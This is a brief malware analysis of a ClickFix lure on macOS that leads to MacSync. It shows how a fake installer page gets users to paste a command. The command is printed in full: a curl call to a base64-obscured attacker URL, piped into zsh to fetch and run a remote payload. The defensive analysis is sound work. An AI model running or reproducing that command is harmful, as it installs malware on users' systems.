## From ClickFix to MacSync: Execution Chain Analysis on macOS

ClickFix is a social-engineering technique that relies on convincing users to perform a manual action, typically pasting and executing a command under the guise of fixing a problem. It first gained wider attention in the wild through fake CAPTCHA and “verify you are human” pages, where users were instructed to copy and run commands to proceed. Since then, ClickFix has been reused across multiple campaigns as a lightweight initial access method.

This execution chain starts with the following domain, which is often the target from various malvertising domains:

Domain: hxxps[://]macfilearchive[.]com/s3/

<img width="1007" height="1069" alt="image" src="https://github.com/user-attachments/assets/dab21879-3c91-4020-9ba8-34872b43d6a5" />

This legitimate looking domain instructs users to copy and paste the command in the code block. At first glance, it seems harmless as it is referencing Apple's legitimate domain, but the full command is as follows:

```
echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && curl -kfsSL $(echo 'aHR0cDovL2JhbGxmcmFuay50b2RheS9jdXJsLzI3MDY1M2Y4NjJmMGVlMjFkY2UwYTQ2ZTQ4MDFlYzI4ZGI0ZGRjNzdiNmZiYTkzNDFiMWI4ZGIyOTkwOWM1MTQ='|base64 -D)|zsh
```

A curl command is appended which executes a Base64 chunk, decoded to reveal:

```
hxxp[://]ballfrank[.]today/curl/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514
```

